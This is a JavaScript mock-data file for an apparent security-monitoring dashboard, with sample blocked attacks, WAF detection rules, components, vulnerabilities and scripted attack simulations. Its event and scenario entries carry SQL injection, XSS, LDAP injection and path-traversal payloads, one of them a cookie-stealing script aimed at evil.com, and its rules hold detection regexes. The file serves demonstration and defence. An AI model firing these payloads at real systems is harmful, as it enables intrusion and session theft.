// src/data/mockData.js

// Mock security events
export const mockSecurityEvents = [
    {
      id: 'event-1',
      timestamp: '2025-05-07T08:23:12Z',
      type: 'sql_injection',
      source: '192.168.1.105',
      target: '/api/users',
      severity: 'high',
      status: 'blocked',
      description: 'SQL Injection attempt blocked',
      details: {
        payload: "' OR 1=1; --",
        rule: 'SQL-INJECTION-001',
        component: 'web_application_firewall'
      }
    },
    {
      id: 'event-2',
      timestamp: '2025-05-07T08:15:43Z',
      type: 'xss',
      source: '192.168.1.110',
      target: '/login',
      severity: 'medium',
      status: 'blocked',
      description: 'XSS attempt detected and blocked',
      details: {
        payload: "<script>alert('XSS')</script>",
        rule: 'XSS-DEFENSE-002',
        component: 'web_application_firewall'
      }
    },
    {
      id: 'event-3',
      timestamp: '2025-05-07T07:58:21Z',
      type: 'ldap_injection',
      source: '192.168.1.120',
      target: '/auth/ldap',
      severity: 'critical',
      status: 'blocked',
      description: 'LDAP Injection attempt detected and blocked',
      details: {
        payload: ")(|(password=*))",
        rule: 'LDAP-INJECTION-003',
        component: 'authentication_system'
      }
    },
    {
      id: 'event-4',
      timestamp: '2025-05-07T07:45:16Z',
      type: 'brute_force',
      source: '192.168.1.130',
      target: '/admin/login',
      severity: 'medium',
      status: 'blocked',
      description: 'Brute force login attempt detected',
      details: {
        attempts: 15,
        rule: 'BRUTE-FORCE-001',
        component: 'authentication_system'
      }
    },
    {
      id: 'event-5',
      timestamp: '2025-05-07T07:32:09Z',
      type: 'file_inclusion',
      source: '192.168.1.140',
      target: '/api/includes',
      severity: 'high',
      status: 'blocked',
      description: 'Local File Inclusion attempt detected',
      details: {
        payload: "../../../etc/passwd",
        rule: 'FILE-INCLUSION-002',
        component: 'web_application_firewall'
      }
    },
    {
      id: 'event-6',
      timestamp: '2025-05-07T06:17:33Z',
      type: 'system_update',
      source: 'system',
      target: 'web_application_firewall',
      severity: 'info',
      status: 'success',
      description: 'WAF rules updated successfully',
      details: {
        rulesAdded: 5,
        rulesUpdated: 12,
        rulesRemoved: 2
      }
    },
    {
      id: 'event-7',
      timestamp: '2025-05-07T02:13:45Z',
      type: 'sql_injection',
      source: '192.168.1.155',
      target: '/api/products',
      severity: 'critical',
      status: 'detected',
      description: 'SQL Injection attempt detected - investigation required',
      details: {
        payload: "UNION SELECT username, password FROM users",
        rule: 'SQL-INJECTION-004',
        component: 'database_firewall'
      }
    },
    {
      id: 'event-8',
      timestamp: '2025-05-06T21:45:12Z',
      type: 'xss',
      source: '192.168.1.160',
      target: '/contact',
      severity: 'medium',
      status: 'blocked',
      description: 'Stored XSS attempt blocked',
      details: {
        payload: "<img src='x' onerror='alert(1)'>",
        rule: 'XSS-DEFENSE-003',
        component: 'web_application_firewall'
      }
    },
    {
      id: 'event-9',
      timestamp: '2025-05-06T19:23:05Z',
      type: 'scan',
      source: '192.168.1.100',
      target: 'system',
      severity: 'info',
      status: 'success',
      description: 'Scheduled vulnerability scan completed',
      details: {
        vulnerabilitiesFound: 3,
        criticalIssues: 0,
        highIssues: 1,
        mediumIssues: 2
      }
    },
    {
      id: 'event-10',
      timestamp: '2025-05-06T16:12:34Z',
      type: 'ldap_injection',
      source: '192.168.1.175',
      target: '/auth/login',
      severity: 'high',
      status: 'blocked',
      description: 'LDAP Injection attempt detected and blocked',
      details: {
        payload: "*)(uid=*)(|(uid=*",
        rule: 'LDAP-INJECTION-002',
        component: 'authentication_system'
      }
    }
  ];
  
  // Mock security rules
  export const mockSecurityRules = [
    {
      id: 'rule-1',
      name: 'SQL Injection Protection',
      description: 'Detects and blocks common SQL injection patterns',
      type: 'sql_injection',
      target: 'web_application_firewall',
      priority: 'high',
      status: 'active',
      patterns: [
        "';.*--",
        "UNION\\s+SELECT",
        "OR\\s+1=1",
        "DROP\\s+TABLE",
        "INSERT\\s+INTO"
      ],
      action: 'block',
      createdAt: '2025-01-15T10:00:00Z',
      updatedAt: '2025-04-20T14:30:00Z'
    },
    {
      id: 'rule-2',
      name: 'XSS Attack Prevention',
      description: 'Detects and blocks cross-site scripting attempts',
      type: 'xss',
      target: 'web_application_firewall',
      priority: 'high',
      status: 'active',
      patterns: [
        "<script.*>",
        "javascript:",
        "onerror=",
        "onload=",
        "eval\\("
      ],
      action: 'block',
      createdAt: '2025-01-18T11:20:00Z',
      updatedAt: '2025-04-22T09:15:00Z'
    },
    {
      id: 'rule-3',
      name: 'LDAP Injection Protection',
      description: 'Prevents LDAP injection attacks on authentication systems',
      type: 'ldap_injection',
      target: 'authentication_system',
      priority: 'high',
      status: 'active',
      patterns: [
        "\\|\\|",
        "\\(\\|\\(",
        "\\)\\(\\|",
        "\\*\\)",
        "objectClass=*"
      ],
      action: 'block',
      createdAt: '2025-01-20T13:45:00Z',
      updatedAt: '2025-04-18T16:30:00Z'
    },
    {
      id: 'rule-4',
      name: 'File Inclusion Protection',
      description: 'Prevents local and remote file inclusion attacks',
      type: 'file_inclusion',
      target: 'web_application_firewall',
      priority: 'medium',
      status: 'active',
      patterns: [
        "\\.\\./",
        "file:",
        "/etc/passwd",
        "C:\\\\Windows",
        "php://input"
      ],
      action: 'block',
      createdAt: '2025-02-05T09:30:00Z',
      updatedAt: '2025-04-10T11:20:00Z'
    },
    {
      id: 'rule-5',
      name: 'Brute Force Protection',
      description: 'Detects and blocks brute force login attempts',
      type: 'brute_force',
      target: 'authentication_system',
      priority: 'medium',
      status: 'active',
      patterns: [],
      conditions: {
        maxAttempts: 5,
        timeWindow: 300, // 5 minutes
        lockoutDuration: 1800 // 30 minutes
      },
      action: 'block_ip',
      createdAt: '2025-02-10T14:15:00Z',
      updatedAt: '2025-03-28T10:45:00Z'
    },
    {
      id: 'rule-6',
      name: 'Command Injection Protection',
      description: 'Prevents OS command injection attacks',
      type: 'command_injection',
      target: 'web_application_firewall',
      priority: 'high',
      status: 'active',
      patterns: [
        ";\\s*\\w+\\s+",
        "\\|\\s*\\w+\\s+",
        "`\\w+`",
        "\\$\\(\\w+\\)",
        "&\\s*\\w+\\s+"
      ],
      action: 'block',
      createdAt: '2025-02-15T16:20:00Z',
      updatedAt: '2025-04-05T15:10:00Z'
    },
    {
      id: 'rule-7',
      name: 'SQL Query Monitoring',
      description: 'Monitors database queries for suspicious patterns',
      type: 'database_monitoring',
      target: 'database_firewall',
      priority: 'medium',
      status: 'active',
      patterns: [
        "SELECT\\s+\\*\\s+FROM",
        "DELETE\\s+FROM",
        "DROP\\s+",
        "TRUNCATE\\s+",
        "ALTER\\s+"
      ],
      action: 'log',
      createdAt: '2025-02-20T13:10:00Z',
      updatedAt: '2025-03-15T11:30:00Z'
    },
    {
      id: 'rule-8',
      name: 'API Rate Limiting',
      description: 'Limits API request rates to prevent abuse',
      type: 'rate_limiting',
      target: 'web_application_firewall',
      priority: 'low',
      status: 'active',
      conditions: {
        maxRequests: 100,
        timeWindow: 60, // 1 minute
        perIp: true
      },
      action: 'throttle',
      createdAt: '2025-03-01T10:45:00Z',
      updatedAt: '2025-04-12T14:20:00Z'
    }
  ];
  
  // Mock system components
  export const mockComponents = [
    {
      id: 'comp-1',
      name: 'Web Application Firewall',
      type: 'protection',
      description: 'ModSecurity-based WAF with OWASP ruleset',
      status: 'operational',
      version: '3.2.0',
      lastUpdated: '2025-04-25T10:30:00Z',
      metrics: {
        attacksBlocked: 1245,
        falsePositives: 23,
        processingLatency: 2.3 // ms
      }
    },
    {
      id: 'comp-2',
      name: 'Database Firewall',
      type: 'protection',
      description: 'GreenSQL database protection system',
      status: 'operational',
      version: '2.5.1',
      lastUpdated: '2025-04-20T14:15:00Z',
      metrics: {
        attacksBlocked: 345,
        falsePositives: 12,
        processingLatency: 1.8 // ms
      }
    },
    {
      id: 'comp-3',
      name: 'Network Intrusion Detection',
      type: 'monitoring',
      description: 'Suricata-based network monitoring',
      status: 'operational',
      version: '6.1.0',
      lastUpdated: '2025-04-22T09:45:00Z',
      metrics: {
        eventsDetected: 4567,
        falsePositives: 87,
        processingLatency: 3.1 // ms
      }
    },
    {
      id: 'comp-4',
      name: 'Authentication System',
      type: 'protection',
      description: 'Keycloak-based authentication service',
      status: 'operational',
      version: '2.5.0',
      lastUpdated: '2025-04-18T11:20:00Z',
      metrics: {
        loginAttempts: 2345,
        failedLogins: 120,
        processingLatency: 1.5 // ms
      }
    },
    {
      id: 'comp-5',
      name: 'Vulnerability Scanner',
      type: 'monitoring',
      description: 'OWASP ZAP-based vulnerability assessment',
      status: 'operational',
      version: '3.0.0',
      lastUpdated: '2025-04-15T16:30:00Z',
      metrics: {
        scansCompleted: 45,
        vulnerabilitiesFound: 23,
        scanDuration: 25.4 // minutes
      }
    },
    {
      id: 'comp-6',
      name: 'Log Management',
      type: 'monitoring',
      description: 'Graylog-based log collection and analysis',
      status: 'operational',
      version: '4.2.1',
      lastUpdated: '2025-04-12T13:10:00Z',
      metrics: {
        logsCollected: 15678943,
        alertsGenerated: 245,
        storageUsed: 128.5 // GB
      }
    },
    {
      id: 'comp-7',
      name: 'Host-based Security',
      type: 'protection',
      description: 'Wazuh-based host monitoring and protection',
      status: 'operational',
      version: '5.0.0',
      lastUpdated: '2025-04-10T14:45:00Z',
      metrics: {
        hostsMonitored: 25,
        incidentsDetected: 78,
        resourceUsage: 4.2 // % CPU
      }
    },
    {
      id: 'comp-8',
      name: 'Response Orchestration',
      type: 'response',
      description: 'TheHive & Cortex security response platform',
      status: 'operational',
      version: '4.1.0',
      lastUpdated: '2025-04-05T15:30:00Z',
      metrics: {
        casesHandled: 56,
        meanTimeToRespond: 12.5, // minutes
        automatedResponses: 34
      }
    }
  ];
  
  // Mock vulnerabilities
  export const mockVulnerabilities = [
    {
      id: 'vuln-1',
      name: 'Outdated jQuery Library',
      type: 'library',
      severity: 'medium',
      description: 'An outdated version of jQuery is being used, which contains known XSS vulnerabilities',
      location: '/assets/js/jquery.min.js',
      detectedAt: '2025-05-06T16:30:00Z',
      status: 'open',
      recommendation: 'Update jQuery to the latest version (3.7.0 or newer)'
    },
    {
      id: 'vuln-2',
      name: 'Missing Content Security Policy',
      type: 'configuration',
      severity: 'medium',
      description: 'The application does not implement a Content Security Policy, increasing XSS risk',
      location: 'HTTP Headers',
      detectedAt: '2025-05-06T16:35:00Z',
      status: 'open',
      recommendation: 'Implement a strict Content Security Policy'
    },
    {
      id: 'vuln-3',
      name: 'Insecure Cookie Configuration',
      type: 'configuration',
      severity: 'low',
      description: 'Session cookies do not have the secure and httpOnly flags set',
      location: 'Cookie Configuration',
      detectedAt: '2025-05-06T16:40:00Z',
      status: 'open',
      recommendation: 'Set secure and httpOnly flags for all sensitive cookies'
    },
    {
      id: 'vuln-4',
      name: 'SQL Injection in Search Function',
      type: 'code',
      severity: 'high',
      description: 'The product search function is vulnerable to SQL injection attacks',
      location: '/api/products/search',
      detectedAt: '2025-05-06T16:45:00Z',
      status: 'open',
      recommendation: 'Implement parameterized queries for all database operations'
    },
    {
      id: 'vuln-5',
      name: 'Exposed Admin Interface',
      type: 'configuration',
      severity: 'high',
      description: 'The admin interface is accessible from external networks without adequate protection',
      location: '/admin',
      detectedAt: '2025-05-06T16:50:00Z',
      status: 'open',
      recommendation: 'Restrict admin interface access to internal networks and implement strong authentication'
    }
  ];
  
  // Mock attack scenarios for simulation
  export const mockAttackScenarios = [
    {
      id: 'scenario-1',
      name: 'SQL Injection Attack Simulation',
      description: 'Simulates a series of SQL injection attempts targeting the web application and database',
      attackType: 'sql_injection',
      difficulty: 'medium',
      steps: [
        {
          type: 'info',
          description: 'Attacker begins reconnaissance of web application',
          details: {
            timeElapsed: '0:00'
          }
        },
        {
          type: 'attack',
          attackType: 'sql_injection',
          source: '192.168.1.200',
          target: '/api/users',
          severity: 'medium',
          description: 'Basic SQL injection attempt with single quote',
          details: {
            payload: "username=' OR '1'='1",
            timeElapsed: '0:15'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'attack',
          attackType: 'sql_injection',
          source: '192.168.1.200',
          target: '/api/products',
          severity: 'medium',
          description: 'SQL injection attempt bypassing frontend validation',
          details: {
            payload: "product_id=1 UNION SELECT username, password FROM users",
            timeElapsed: '0:45'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'defense',
          component: 'comp-2',
          description: 'Database firewall detects suspicious query pattern',
          details: {
            timeElapsed: '0:50'
          }
        },
        {
          type: 'attack',
          attackType: 'sql_injection',
          source: '192.168.1.201',
          target: '/api/search',
          severity: 'high',
          description: 'Advanced SQL injection using UNION SELECT and subqueries',
          details: {
            payload: "search=test'); UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = 'public' --",
            timeElapsed: '1:30'
          },
          blocked: true,
          affectedComponent: 'comp-2'
        },
        {
          type: 'attack',
          attackType: 'sql_injection',
          source: '192.168.1.202',
          target: '/api/reports',
          severity: 'critical',
          description: 'Blind SQL injection attempt using time delays',
          details: {
            payload: "report_id=1; SELECT CASE WHEN (username='admin') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users --",
            timeElapsed: '2:15'
          },
          blocked: true,
          affectedComponent: 'comp-2'
        },
        {
          type: 'defense',
          component: 'comp-8',
          description: 'Response orchestration system blocks attacker IP address',
          details: {
            timeElapsed: '2:20'
          }
        },
        {
          type: 'info',
          description: 'Attack simulation completed',
          details: {
            timeElapsed: '2:30'
          }
        }
      ]
    },
    {
      id: 'scenario-2',
      name: 'Cross-Site Scripting (XSS) Attack Simulation',
      description: 'Simulates various XSS attack vectors targeting the web application',
      attackType: 'xss',
      difficulty: 'easy',
      steps: [
        {
          type: 'info',
          description: 'Attacker begins testing for XSS vulnerabilities',
          details: {
            timeElapsed: '0:00'
          }
        },
        {
          type: 'attack',
          attackType: 'xss',
          source: '192.168.1.210',
          target: '/contact',
          severity: 'medium',
          description: 'Basic reflected XSS attempt',
          details: {
            payload: "<script>alert('XSS')</script>",
            timeElapsed: '0:10'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'attack',
          attackType: 'xss',
          source: '192.168.1.210',
          target: '/comments',
          severity: 'medium',
          description: 'Stored XSS attempt in comments',
          details: {
            payload: "<img src='x' onerror='alert(document.cookie)'>",
            timeElapsed: '0:30'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'attack',
          attackType: 'xss',
          source: '192.168.1.211',
          target: '/search',
          severity: 'high',
          description: 'XSS using JavaScript event handlers',
          details: {
            payload: "<div onmouseover='javascript:alert(1)'>Hover me</div>",
            timeElapsed: '0:50'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'attack',
          attackType: 'xss',
          source: '192.168.1.212',
          target: '/profile',
          severity: 'high',
          description: 'DOM-based XSS attempt',
          details: {
            payload: "profile?name=<script>document.location='http://evil.com/steal.php?cookie='+document.cookie</script>",
            timeElapsed: '1:15'
          },
          blocked: true,
          affectedComponent: 'comp-1'
        },
        {
          type: 'defense',
          component: 'comp-8',
          description: 'Response system updates WAF rules to block new attack patterns',
          details: {
            timeElapsed: '1:20'
          }
        },
        {
          type: 'info',
          description: 'Attack simulation completed',
          details: {
            timeElapsed: '1:30'
          }
        }
      ]
    },
    {
      id: 'scenario-3',
      name: 'LDAP Injection Attack Simulation',
      description: 'Simulates LDAP injection attacks targeting the authentication system',
      attackType: 'ldap_injection',
      difficulty: 'hard',
      steps: [
        {
          type: 'info',
          description: 'Attacker begins probing the authentication system',
          details: {
            timeElapsed: '0:00'
          }
        },
        {
          type: 'attack',
          attackType: 'ldap_injection',
          source: '192.168.1.220',
          target: '/auth/login',
          severity: 'medium',
          description: 'Basic LDAP injection attempt with wildcard',
          details: {
            payload: "username=*)(cn=*",
            timeElapsed: '0:15'
          },
          blocked: true,
          affectedComponent: 'comp-4'
        },
        {
          type: 'attack',
          attackType: 'ldap_injection',
          source: '192.168.1.220',
          target: '/auth/reset',
          severity: 'high',
          description: 'LDAP injection targeting password reset',
          details: {
            payload: "email=*)(|(mail=*",
            timeElapsed: '0:45'
          },
          blocked: true,
          affectedComponent: 'comp-4'
        },
        {
          type: 'defense',
          component: 'comp-3',
          description: 'Network IDS detects pattern of LDAP injection attempts',
          details: {
            timeElapsed: '0:50'
          }
        },
        {
          type: 'attack',
          attackType: 'ldap_injection',
          source: '192.168.1.221',
          target: '/auth/admin',
          severity: 'critical',
          description: 'Advanced LDAP injection attempt to bypass admin authentication',
          details: {
            payload: "username=admin)(&)(objectClass=*",
            timeElapsed: '1:15'
          },
          blocked: false,
          affectedComponent: 'comp-4'
        },
        {
          type: 'defense',
          component: 'comp-4',
          description: 'Authentication system detects compromise and initiates recovery',
          details: {
            timeElapsed: '1:20'
          }
        },
        {
          type: 'defense',
          component: 'comp-8',
          description: 'Response orchestration blocks attacker IP and initiates incident response',
          details: {
            timeElapsed: '1:25'
          }
        },
        {
          type: 'info',
          description: 'Attack simulation completed',
          details: {
            timeElapsed: '1:30'
          }
        }
      ]
    }
  ];
  
  // Combine all mock data
  export const mockSecurityData = {
    events: mockSecurityEvents,
    rules: mockSecurityRules,
    components: mockComponents,
    vulnerabilities: mockVulnerabilities,
    attackScenarios: mockAttackScenarios
  };